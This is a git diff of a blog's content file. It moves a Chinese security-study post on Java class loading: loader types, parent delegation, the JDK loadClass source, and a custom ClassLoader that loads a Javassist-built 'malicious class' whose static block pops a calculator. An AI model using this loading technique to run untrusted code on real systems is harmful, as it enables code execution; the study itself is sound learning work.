-<p>从系统属性：<code>java.ext.dirs</code>目录中加载类库，或者从JDK安装目录：<code>jre/lib/ext</code>目录下加载类库。我们就可以将我们自己的包放在以上目录下，就会自动加载进来了。</p>
-<h3 id="应用程序类加载器：Application-Classloader"><a href="#应用程序类加载器：Application-Classloader" class="headerlink" title="应用程序类加载器：Application Classloader"></a>应用程序类加载器：Application Classloader</h3><p>程序默认的类加载器，我们编写的类就是由他来加载。</p>
-<p>Java语言编写，由sun.misc.Launcher$AppClassLoader实现。<br>派生继承自<code>java.lang.ClassLoader</code>，父类加载器为ExtClassloader</p>
-<p>它负责加载环境变量classpath或者系统属性java.class.path指定路径下的类库</p>
-<p>我们可以通过<code>ClassLoader#getSystemClassLoader()</code>获取并操作这个加载器</p>
-<h3 id="自定义加载器"><a href="#自定义加载器" class="headerlink" title="自定义加载器"></a>自定义加载器</h3><p>为了实现自己的功能，比如加强安全传输，我们可以自己编写加载器。</p>
-<p>继承<code>java.lang.ClassLoader</code>类，重写findClass()方法如果没有太复杂的需求，可以直接继承<code>URLClassLoader</code>类，重写<code>loadClass</code>方法，具体可参考<code>AppClassLoader</code>和<code>ExtClassLoader</code>。</p>
-<h2 id="获取ClassLoader"><a href="#获取ClassLoader" class="headerlink" title="获取ClassLoader"></a>获取ClassLoader</h2><p>除了启动类加载器，其他加载器都是继承自<code>java.lang.ClassLoader</code>这个抽象类。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：获取当前类的 ClassLoader</span></span><br><span class="line">clazz.getClassLoader()</span><br><span class="line"><span class="comment">// 方式二：获取当前线程上下文的 ClassLoader</span></span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="comment">// 方式三：获取系统的 ClassLoader</span></span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line"><span class="comment">// 方式四：获取调用者的 ClassLoader</span></span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure>
-
-<h1 id="类加载机制-双亲委派"><a href="#类加载机制-双亲委派" class="headerlink" title="类加载机制-双亲委派"></a>类加载机制-双亲委派</h1><p>jvm对class文件采用的是按需加载的方式，当需要使用该类时，jvm才会将它的class文件加载到内存中产生class对象。</p>
-<p>在加载类的时候，是采用的<code>双亲委派机制</code>，即把请求交给父类处理的一种<code>任务委派模式。</code></p>
-<p>这也被叫做<code>双亲委派模型</code>，在jdk1.2之后引入</p>
-<blockquote>
-<p>其中，两个用户自定义类加载器的父加载器是AppClassLoader，AppClassLoader的父加载器是ExtClassLoader，ExtClassLoader是没有父类加载器的，在代码中，ExtClassLoader的父类加载器为null。BootstrapClassLoader也并没有子类，因为他完全由JVM实现。</p>
-</blockquote>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318212050-guhqqwe.png" alt="image.png"></p>
-<h2 id="工作逻辑"><a href="#工作逻辑" class="headerlink" title="工作逻辑"></a>工作逻辑</h2><p>（1）如果一个<code>类加载器</code>接收到了<code>类加载</code>的请求，它自己不会先去加载，会把这个请求委托给<code>父类加载器</code>去执行。</p>
-<p>（2）如果父类还存在父类加载器，则继续向上委托，一直委托到<code>启动类加载器：Bootstrap ClassLoader</code></p>
-<p>（3）如果父类加载器可以完成加载任务，就返回成功结果，如果父类加载失败，就由子类自己去尝试加载，如果子类加载失败就会抛出<code>ClassNotFoundException</code>异常，这就是<code>双亲委派模式</code></p>
-<h2 id="使用目的"><a href="#使用目的" class="headerlink" title="使用目的"></a>使用目的</h2><p>双亲委派模型能够保证类在内存中的<strong>唯一性</strong>，能够保证系统级别类的安全，因为当启动类ClassLoader加载过了之后，子ClassLoader便不会再加载：</p>
-<p>1、防止重复加载同一个<code>.class</code>。通过委托去向上面问一问，加载过了，就不用再加载一遍。保证数据安全。<br>2、保证核心<code>.class</code>不能被篡改。通过委托方式，不会去篡改核心<code>.clas</code>，即使篡改也不会去加载，即使加载也不会是同一个<code>.class</code>对象了。不同的加载器加载同一个<code>.class</code>也不是同一个<code>Class</code>对象。这样保证了<code>Class</code>执行安全。</p>
-<h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><p>loadClass方法如下，代码中做了注释解析</p>
-<p>双亲委派模型实现的核心就是这个loadClass方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        <span class="comment">// 先查看这个类是否已经被自己加载了</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 如果有父类加载器，先委派给父类加载器来加载</span></span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果父类加载器为null，说明ExtClassLoader也没有找到目标类，则调用BootstrapClassLoader来查找</span></span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果都没有找到，调用findClass方法，尝试自己加载这个类</span></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h1><p>我们可以实现自己的类加载器，加载<strong>指定路径</strong>下的class文件</p>
-<ul>
-<li>通过loadClass在指定的路径下查找文件。</li>
-<li>通过findClass方法解析class字节流，并实例化class对象。</li>
-</ul>
-<p>编写一个自己的ClassLoader</p>
-<blockquote>
-<p>defineClass：将字节码变成内存中的class</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xianbei.test3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String classPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestClassLoader</span><span class="params">(String classPath)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classPath = classPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = getData(name);</span><br><span class="line">            <span class="comment">//defineClass来生成class实例</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name,classBytes,<span class="number">0</span>,classBytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//该方法读取目标class文件的字节码并返回</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] getData(String className) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> classPath+ File.separator + className.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//读取字节</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((num = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                stream.write(buffer, <span class="number">0</span> ,num);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> stream.toByteArray();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>然后我们尝试加载自己电脑上指定路径的class文件：</p>
-<p>这是我要加载的class文件，之前用JAVAssist控制字节码编写的恶意类</p>
-<blockquote>
-<p>这里有个静态块，就是最后的static</p>
-<p>在实例化的时候会被自动加载</p>
-<p>关于JAVAssist不在此多做赘述</p>
-</blockquote>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318233518-9dfmw13.png" alt="image.png"></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCLDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">myClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>(<span class="string">&quot;C:\\Users\\Liyc\\IdeaProjects\\JavassistTest\\out&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; newStudent = myClassLoader.loadClass(<span class="string">&quot;NewStudent&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; c = newStudent.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> c.newInstance(<span class="string">&quot;Xianbei&quot;</span>,<span class="number">19</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318233657-sw8m038.png" alt="image.png"></p>
-<p>成功弹出计算机，也就是成功加载了指定路径下的class文件并且用反射将其实例化了。</p>
-<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>贴几张好文和好图</p>
-<p><a href="https://www.cnblogs.com/goloving/p/14438785.html">https://www.cnblogs.com/goloving/p/14438785.html</a>讲双亲委派的</p>
-<p><a href="https://www.jianshu.com/p/fe8a01b0c3b7">https://www.jianshu.com/p/fe8a01b0c3b7</a>讲java代码运行机制的</p>
-<p><a href="https://zhuanlan.zhihu.com/p/67991761">https://zhuanlan.zhihu.com/p/67991761</a>讲类加载的</p>
-<p><a href="https://www.cnblogs.com/xrq730/p/4847337.html">https://www.cnblogs.com/xrq730/p/4847337.html</a>很多种类加载器的写法</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318213310-uz3iggg.png" alt="image.png"></p>
 ]]></content>
       <categories>
         <category>javaSec</category>
@@ -1380,6 +1253,223 @@
       </categories>
       <tags>
         <tag>java反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【基础】-JAVA 类加载</title>
+    <url>/2022/03/18/jichu-classloader/</url>
+    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>从一下几个方面了解JAVA中，类加载的原理</p>
+<ol>
+<li>java代码执行过程</li>
+<li>类的加载过程</li>
+<li>类加载器</li>
+<li>类加载机制</li>
+<li>自定义一个自己的类加载器</li>
+</ol>
+<h1 id="java代码执行流程"><a href="#java代码执行流程" class="headerlink" title="java代码执行流程"></a>java代码执行流程</h1><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318204423-paolccp.png" alt="image.png"><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318204536-oxlseqj.png" alt="image.png"></p>
+<p>当 .java 源码被 javac.exe 编译器编译成 .class 字节码文件后，接下来的工作就交给JVM处理。JVM首先通过类加载器(ClassLoader)，将class文件和相关Java API加载装入JVM，以供JVM后续处理。</p>
+<h1 id="类的加载过程"><a href="#类的加载过程" class="headerlink" title="类的加载过程"></a>类的加载过程</h1><p>类的生命周期包括：加载、链接、初始化、使用、卸载</p>
+<p>其中前三个属于类的<u>加载过程</u></p>
+<h2 id="加载-loading"><a href="#加载-loading" class="headerlink" title="加载-loading"></a>加载-loading</h2><p>把<code>.class</code>文件加载到JVM里的过程</p>
+<ul>
+<li>通过类的全限定名来获取定义此类的二进制字节流</li>
+<li>将此二进制字节流所代表的静态存储结构转化成方法区的运行时数据结构</li>
+<li>在内存中生成代表此类的java.lang.Class对象,作为该类访问入口.</li>
+</ul>
+<h2 id="链接-linking"><a href="#链接-linking" class="headerlink" title="链接-linking"></a>链接-linking</h2><p>链接分为三步</p>
+<ul>
+<li><p>验证:验证的目的是确保class文件的字节流中信息符合虚拟机的要求，不会危害虚拟机安全，使得虚拟机免受恶意代码的攻击，这一步至关重要。</p>
+<blockquote>
+<p>文件格式验证<br>源数据验证<br>字节码验证<br>符号引用验证  </p>
+</blockquote>
+</li>
+<li><p>准备:准备阶段的工作就是为类的静态变量<strong>分配内存</strong>并设为jvm默认的<strong>初值</strong>，对于非静态的变量，则不会为它们分配内存。静态变量的初值为jvm默认的初值，而不是我们在程序中设定的初值。(仅包含类变量,不包含实例变量).</p>
+</li>
+<li><p>解析:虚拟机将常量池中的符号引用替换为直接引用，解析动作主要针对类或接口，字段，类方法，方法类型等等。</p>
+</li>
+</ul>
+<h2 id="初始化-initialization"><a href="#初始化-initialization" class="headerlink" title="初始化-initialization"></a>初始化-initialization</h2><p>在该阶段，才真正意义上的开始执行类中定义的java程序代码，该阶段会执行类构造器。</p>
+<blockquote>
+<p>暂讨论关于类生命周期的三种，之后在学习内存的时候细嗦</p>
+</blockquote>
+<h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><h2 id="ClassLoader的作用"><a href="#ClassLoader的作用" class="headerlink" title="ClassLoader的作用"></a>ClassLoader的作用</h2><blockquote>
+<p><strong>ClassLoader用于将class文件加载到JVM中。</strong></p>
+</blockquote>
+<p>另外一个作用是确认每个类应该由哪个类加载器加载。<br>第二个作用也用于判断JVM运行时的两个类是否相等，影响的判断方法有equals()、isAssignableFrom()、isInstance()以及instanceof关键字。</p>
+<h2 id="何时触发类加载"><a href="#何时触发类加载" class="headerlink" title="何时触发类加载"></a>何时触发类加载</h2><p>类加载的触发可以分为隐式加载和显示加载。</p>
+<h3 id="隐式加载"><a href="#隐式加载" class="headerlink" title="隐式加载"></a>隐式加载</h3><p>隐式加载包括以下几种情况：</p>
+<ul>
+<li>遇到new、getstatic、putstatic、invokestatic这4条字节码指令时</li>
+<li>对类进行反射调用时</li>
+<li>当初始化一个类时，如果其父类还没有初始化，优先加载其父类并初始化</li>
+<li>虚拟机启动时，需指定一个包含main函数的主类，优先加载并初始化这个主类</li>
+</ul>
+<h3 id="显式加载"><a href="#显式加载" class="headerlink" title="显式加载"></a>显式加载</h3><p>显示加载包含以下几种情况：</p>
+<ul>
+<li>通过ClassLoader的loadClass方法</li>
+<li>通过Class.forName（反射获取Class）</li>
+<li>通过ClassLoader的findClass方法</li>
+</ul>
+<h2 id="ClassLoader分类"><a href="#ClassLoader分类" class="headerlink" title="ClassLoader分类"></a>ClassLoader分类</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318210756-8jnb18t.png" alt="image.png"></p>
+<p>从上到下认识他们</p>
+<h3 id="启动类-x2F-引导类：Bootstrap-ClassLoader"><a href="#启动类-x2F-引导类：Bootstrap-ClassLoader" class="headerlink" title="启动类&#x2F;引导类：Bootstrap ClassLoader"></a>启动类&#x2F;引导类：Bootstrap ClassLoader</h3><p>这个类加载器使用C&#x2F;C++语言实现的，嵌套在JVM内部，java程序无法直接操作这个类。它用来加载<strong>Java核心类库</strong>，如：<code>JAVA_HOME/jre/lib/rt.jar</code>、<code>resources.jar</code>、<code>sun.boot.class.path</code>路径下的包，用于提供<strong>jvm运行所需的包</strong>。</p>
+<p>并不是继承自java.lang.ClassLoader，它没有父类加载器</p>
+<p>它加载<code>扩展类加载器</code>和<code>应用程序类加载器</code>，并成为他们的<strong>父类加载器</strong></p>
+<p>出于安全考虑，启动类只加载包名为：java、javax、sun开头的类</p>
+<h3 id="扩展类加载器：Extension-ClassLoader"><a href="#扩展类加载器：Extension-ClassLoader" class="headerlink" title="扩展类加载器：Extension ClassLoader"></a>扩展类加载器：Extension ClassLoader</h3><p>Java语言编写，由<code>sun.misc.Launcher$ExtClassLoader</code>实现，我们可以用Java程序操作这个加载器派生继承自java.lang.ClassLoader，父类加载器为<code>启动类加载器</code></p>
+<p>从系统属性：<code>java.ext.dirs</code>目录中加载类库，或者从JDK安装目录：<code>jre/lib/ext</code>目录下加载类库。我们就可以将我们自己的包放在以上目录下，就会自动加载进来了。</p>
+<h3 id="应用程序类加载器：Application-Classloader"><a href="#应用程序类加载器：Application-Classloader" class="headerlink" title="应用程序类加载器：Application Classloader"></a>应用程序类加载器：Application Classloader</h3><p>程序默认的类加载器，我们编写的类就是由他来加载。</p>
+<p>Java语言编写，由sun.misc.Launcher$AppClassLoader实现。<br>派生继承自<code>java.lang.ClassLoader</code>，父类加载器为ExtClassloader</p>
+<p>它负责加载环境变量classpath或者系统属性java.class.path指定路径下的类库</p>
+<p>我们可以通过<code>ClassLoader#getSystemClassLoader()</code>获取并操作这个加载器</p>
+<h3 id="自定义加载器"><a href="#自定义加载器" class="headerlink" title="自定义加载器"></a>自定义加载器</h3><p>为了实现自己的功能，比如加强安全传输，我们可以自己编写加载器。</p>
+<p>继承<code>java.lang.ClassLoader</code>类，重写findClass()方法如果没有太复杂的需求，可以直接继承<code>URLClassLoader</code>类，重写<code>loadClass</code>方法，具体可参考<code>AppClassLoader</code>和<code>ExtClassLoader</code>。</p>
+<h2 id="获取ClassLoader"><a href="#获取ClassLoader" class="headerlink" title="获取ClassLoader"></a>获取ClassLoader</h2><p>除了启动类加载器，其他加载器都是继承自<code>java.lang.ClassLoader</code>这个抽象类。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：获取当前类的 ClassLoader</span></span><br><span class="line">clazz.getClassLoader()</span><br><span class="line"><span class="comment">// 方式二：获取当前线程上下文的 ClassLoader</span></span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="comment">// 方式三：获取系统的 ClassLoader</span></span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line"><span class="comment">// 方式四：获取调用者的 ClassLoader</span></span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure>
+
+<h1 id="类加载机制-双亲委派"><a href="#类加载机制-双亲委派" class="headerlink" title="类加载机制-双亲委派"></a>类加载机制-双亲委派</h1><p>jvm对class文件采用的是按需加载的方式，当需要使用该类时，jvm才会将它的class文件加载到内存中产生class对象。</p>
+<p>在加载类的时候，是采用的<code>双亲委派机制</code>，即把请求交给父类处理的一种<code>任务委派模式。</code></p>
+<p>这也被叫做<code>双亲委派模型</code>，在jdk1.2之后引入</p>
+<blockquote>
+<p>其中，两个用户自定义类加载器的父加载器是AppClassLoader，AppClassLoader的父加载器是ExtClassLoader，ExtClassLoader是没有父类加载器的，在代码中，ExtClassLoader的父类加载器为null。BootstrapClassLoader也并没有子类，因为他完全由JVM实现。</p>
+</blockquote>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318212050-guhqqwe.png" alt="image.png"></p>
+<h2 id="工作逻辑"><a href="#工作逻辑" class="headerlink" title="工作逻辑"></a>工作逻辑</h2><p>（1）如果一个<code>类加载器</code>接收到了<code>类加载</code>的请求，它自己不会先去加载，会把这个请求委托给<code>父类加载器</code>去执行。</p>
+<p>（2）如果父类还存在父类加载器，则继续向上委托，一直委托到<code>启动类加载器：Bootstrap ClassLoader</code></p>
+<p>（3）如果父类加载器可以完成加载任务，就返回成功结果，如果父类加载失败，就由子类自己去尝试加载，如果子类加载失败就会抛出<code>ClassNotFoundException</code>异常，这就是<code>双亲委派模式</code></p>
+<h2 id="使用目的"><a href="#使用目的" class="headerlink" title="使用目的"></a>使用目的</h2><p>双亲委派模型能够保证类在内存中的<strong>唯一性</strong>，能够保证系统级别类的安全，因为当启动类ClassLoader加载过了之后，子ClassLoader便不会再加载：</p>
+<p>1、防止重复加载同一个<code>.class</code>。通过委托去向上面问一问，加载过了，就不用再加载一遍。保证数据安全。<br>2、保证核心<code>.class</code>不能被篡改。通过委托方式，不会去篡改核心<code>.clas</code>，即使篡改也不会去加载，即使加载也不会是同一个<code>.class</code>对象了。不同的加载器加载同一个<code>.class</code>也不是同一个<code>Class</code>对象。这样保证了<code>Class</code>执行安全。</p>
+<h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><p>loadClass方法如下，代码中做了注释解析</p>
+<p>双亲委派模型实现的核心就是这个loadClass方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        <span class="comment">// 先查看这个类是否已经被自己加载了</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 如果有父类加载器，先委派给父类加载器来加载</span></span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果父类加载器为null，说明ExtClassLoader也没有找到目标类，则调用BootstrapClassLoader来查找</span></span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果都没有找到，调用findClass方法，尝试自己加载这个类</span></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h1><p>我们可以实现自己的类加载器，加载<strong>指定路径</strong>下的class文件</p>
+<ul>
+<li>通过loadClass在指定的路径下查找文件。</li>
+<li>通过findClass方法解析class字节流，并实例化class对象。</li>
+</ul>
+<p>编写一个自己的ClassLoader</p>
+<blockquote>
+<p>defineClass：将字节码变成内存中的class</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xianbei.test3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String classPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestClassLoader</span><span class="params">(String classPath)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classPath = classPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = getData(name);</span><br><span class="line">            <span class="comment">//defineClass来生成class实例</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name,classBytes,<span class="number">0</span>,classBytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//该方法读取目标class文件的字节码并返回</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] getData(String className) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> classPath+ File.separator + className.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//读取字节</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((num = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                stream.write(buffer, <span class="number">0</span> ,num);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> stream.toByteArray();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>然后我们尝试加载自己电脑上指定路径的class文件：</p>
+<p>这是我要加载的class文件，之前用JAVAssist控制字节码编写的恶意类</p>
